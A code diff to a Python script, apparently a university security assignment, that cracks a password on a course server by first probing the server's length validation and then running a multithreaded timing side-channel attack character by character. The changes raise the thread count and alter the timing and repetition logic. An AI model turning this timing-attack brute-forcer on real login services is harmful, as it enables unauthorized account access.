@@ -12,7 +12,7 @@ _thread_local = threading.local()
 
 ### --- Global Variables --- ###
 
-DIFFICULTY = 5
+DIFFICULTY = 1
 
 BASE_URL = "aoi-assignment1.oy.ne.ro"
 SERVER_PORT = 8080
@@ -21,7 +21,7 @@ CHARSET = "abcdefghijklmnopqrstuvwxyz"
 
 USERNAME = "326529229" # need to recieve
 
-NUMBER_OF_THREADS = 26
+NUMBER_OF_THREADS = 100
 
 PASSWORD = ""
 LENGTH = -1
@@ -32,13 +32,9 @@ getcontext().prec = 30
 
 def split_charset():
     """
-    this function splits the charset into NUMBER_OF_THREADS parts
+    this function splits the charset to chars
     """
-    global CHARSET, NUMBER_OF_THREADS
-    per_thread = len(CHARSET) // NUMBER_OF_THREADS
-    if(len(CHARSET) % NUMBER_OF_THREADS != 0):
-        per_thread += 1
-    parts = [CHARSET[i:i+per_thread] for i in range(0, len(CHARSET), per_thread)]
+    parts = [c for c in CHARSET]
     return parts
 
 ### ------------------------- ###
@@ -100,29 +96,32 @@ def num_repetitions(discovered_length):
     this function returns the number of repetitions needed for each char
     """
     global LENGTH
-    return int(discovered_length/3) + DIFFICULTY + 1
+    # all times 1/internet speed slt
+    return discovered_length + DIFFICULTY*DIFFICULTY + 1
 
 
 def crack_next_char(discovered_length, executor):
     global NUMBER_OF_THREADS
+    # to warm up the connection
+    try_pass2("!")
     r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
     counter = ThreadSafeTimeTracker()
     parts = split_charset()
-    for i in range(r):
-        futures = []
+    futures = []
+    for round in range(r):
         for part in parts:
             futures.append(executor.submit(worker, part, discovered_length, counter))
-        # Wait for all threads to complete
-        for future in futures:
-            future.result()
+    # Wait for all threads to complete
+    # outside of the loop so that each round wont have to wait on 
+    # the previous one to finish
+    for future in futures:
+        future.result()
     return counter.get_max_letter()
     
 
 
 def worker(chars, discovered_length, counter):
     global PASSWORD, LENGTH
-    # to warm up the connection
-    try_pass2("!")
     if LENGTH - discovered_length == 1:
         for char in chars:
             result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
@@ -138,7 +137,9 @@ def worker(chars, discovered_length, counter):
 
 def main():
     global PASSWORD, LENGTH
-    start = time.process_time()
+    start = time.perf_counter()
+    print("Cracking the password...")
+    print("-------------------")
     # first step - exploit the server's length validation
     LENGTH = crack_password_length()
     print(f"Password length: {LENGTH}")
@@ -149,10 +150,10 @@ def main():
             PASSWORD += crack_next_char(discovered_length, executor)
             discovered_length += 1
             print(f"Password so far: {PASSWORD}")
-    end = time.process_time()
+    end = time.perf_counter()
     print("-------------------")
     print(try_pass2(PASSWORD))
-    print(f"total time took: {end-start}")
+    print(f"total time took: {(end-start)/60} minutes")
         
 def test():
     print(try_pass2("usobopdjrcvbvmfz"))
